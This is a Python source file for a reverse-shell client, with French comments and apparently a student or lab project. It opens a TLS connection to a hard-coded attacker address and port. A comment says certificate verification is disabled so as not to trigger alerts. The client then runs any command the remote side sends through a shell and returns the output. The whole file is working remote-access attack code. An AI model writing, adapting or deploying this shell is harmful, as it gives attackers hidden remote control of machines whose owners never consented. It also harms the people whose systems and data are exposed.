# client_revershell
# Version 0.3
# Auteur : Raphaël KATHALUWA-LIYANAGE

# import des librairies suivantes :
# socket = communication entre l'attaquant et la cible
# ssl = chiffrement des échanges
# subprocess = exécution des commandes
# os = manipulation des commandes de l'OS
import socket
import ssl
import subprocess
import os

# /!\ MODIFIER @ HOST AVANT D'EXECUTER LE PROGRAMME
HOST = '192.168.1.6'
PORT = 25566
# taille des messages : 128kB
BUFFER_SIZE = 1024 * 128

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Wrap the socket in an SSL context
context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
# certificat autosigné : désactivation des vérifications
# pour ne pas déclenché d'alerte
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

wrappedSocket = context.wrap_socket(sock, server_hostname=HOST)
wrappedSocket.connect((HOST, PORT))

try:
   while True:
        received_data = wrappedSocket.recv(BUFFER_SIZE)
        # Send the output of the command over the SSL connection
        # Execute a system command

        cmd = received_data.decode().split()
        # la commande a-t-elle des paramètres ?
        if cmd[0] == "cd" or cmd[0] == "CD":
            os.chdir(cmd[1])
            # à supprimer (debug)
            output = "Changed directory to {}".format(os.getcwd())
            wrappedSocket.sendall(output.encode())
        elif cmd[0] == "pwd":
            output = os.getcwd()
            wrappedSocket.sendall(output.encode()) 
        elif cmd[0] == "cp":
            wrappedSocket.sendall(cmd[0].encode())
        elif cmd[0] == "rm":
            wrappedSocket.sendall(cmd[0].encode())
        elif cmd[0] == "who":
            output = os.environ.get('USERNAME')
            wrappedSocket.sendall(output.encode())
        else:
            command = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, 
                                    stderr=subprocess.PIPE)
            output, err = command.communicate()
            if output:
                wrappedSocket.sendall(output) 
            elif err:
                wrappedSocket.sendall(err)
            else:
                wrappedSocket.sendall("[-] Error: couldn't send data".encode())
        """
        elif cmd[0] == "cp" or cmd[0] == "CP":
            send(cmd)
        elif cmd[0] == "rm" or cmd[0] == "RM":
            send(cmd)
        elif cmd[0] == "ping":
            send(cmd)
        elif cmd[0] == "download":
            send(cmd)
        elif cmd[0] == "upload":
            send(cmd)
        elif cmd[0] == "q" or cmd[0] == "quit" or cmd[0] == "exit":
            wrappedSocket.shutdown(socket.SHUT_RDWR)
            wrappedSocket.close()
            exit(0)
        """
except Exception:
    exit(-1)
finally:
    wrappedSocket.shutdown(socket.SHUT_RDWR)
    wrappedSocket.close()
    exit(0)